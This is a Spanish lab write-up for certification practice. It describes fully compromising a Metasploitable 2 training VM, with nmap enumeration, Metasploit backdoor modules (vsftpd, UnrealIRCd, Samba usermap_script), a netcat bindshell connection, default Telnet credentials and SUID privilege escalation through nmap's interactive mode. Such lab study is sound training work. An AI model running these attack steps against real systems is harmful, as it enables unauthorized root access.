# 🐧 Informe de Laboratorio: Metasploitable 2

**IP Objetivo:** `192.168.1.37`
**Sistema Operativo:** Linux (Ubuntu 8.04)
**Fecha:** 15/04/2026
**Objetivo:** Comprometer completamente la máquina mediante explotación de servicios vulnerables y escalada de privilegios.

---

## 🔍 Fase 1: Enumeración y Escaneo

**Comando Nmap utilizado:**
```bash
nmap -sV -p- 192.168.1.37
Servicios Relevantes Detectados:

Puerto	Servicio	Versión	¿Vulnerable?
21	FTP	vsftpd 2.3.4	✅ Backdoor
22	SSH	OpenSSH 4.7p1	✅ Fuerza Bruta
23	Telnet	Linux telnetd	✅ Acceso con creds débiles
445	Samba	smbd 3.X-4.X	✅ usermap_script
1524	Bindshell	Root Shell	✅ Acceso Directo
6667	IRC	UnrealIRCd 3.2.8.1	✅ Backdoor
💥 Fase 2: Explotación (Ganando Acceso)
Victoria 1: Acceso Directo vía Bindshell (Puerto 1524)
Descripción: La máquina tiene una shell de root escuchando directamente.

Comando: nc 192.168.1.37 1524

Resultado: Acceso root inmediato sin autenticación.

Victoria 2: Backdoor vsftpd 2.3.4 (Puerto 21)
Módulo Metasploit: exploit/unix/ftp/vsftpd_234_backdoor

Payload: cmd/unix/reverse

Resultado: Shell de root (uid=0).

Victoria 3: Fuerza Bruta a SSH (Puerto 22) - Lección Aprendida
Herramienta: Hydra (rockyou.txt / fasttrack.txt)

Problema: Incompatibilidad de algoritmos de cifrado SSH en Kali moderna.

Conclusión: El vector de ataque es válido, pero en este entorno fue más eficiente pivotar a Telnet o explotar servicios.

Victoria 4: Backdoor UnrealIRCd (Puerto 6667)
Módulo Metasploit: exploit/unix/irc/unreal_ircd_3281_backdoor

Configuración clave: Requirió establecer LHOST 192.168.1.39.

Resultado: Shell de root.

Victoria 5: Explotación de Samba usermap_script (Puerto 445)
Módulo Metasploit: exploit/multi/samba/usermap_script

Resultado: Shell de root.

🚀 Fase 3: Post-Explotación y Escalada Manual
Victoria 6: Escalada de Privilegios vía SUID (Telnet → nmap)
Acceso Inicial: telnet 192.168.1.37 (Credenciales: msfadmin:msfadmin).

Técnica: Explotación de binarios con bit SUID activado.

Comando de Búsqueda:

bash
find / -perm -u=s -type f 2>/dev/null
Binario Vulnerable: /bin/nmap (modo interactivo).

Explotación:

bash
nmap --interactive
!sh
Resultado: Shell con euid=0(root). Privilegios máximos confirmados.

🧠 Lecciones Aprendidas (Claves para eJPTv2)
Escaneo Exhaustivo: El puerto 1524 (bindshell) no es estándar. Sin un -p- no se habría descubierto.

Payloads en Metasploit: Un payload reverse SIEMPRE necesita la IP del atacante (LHOST).

Problemas Legacy: Sistemas antiguos requieren ajustes en Kali (ssh-rsa, ssh-dss o usar telnet como alternativa).

Escalada Linux: El comando find / -perm -u=s -type f 2>/dev/null es obligatorio memorizarlo para buscar vectores de escalada.

Metodología: A veces la vía más ruidosa (bindshell) es la más rápida. Otras veces la más silenciosa (escalada SUID) es necesaria.

Informe realizado como parte de la preparación para la certificación eJPTv2.


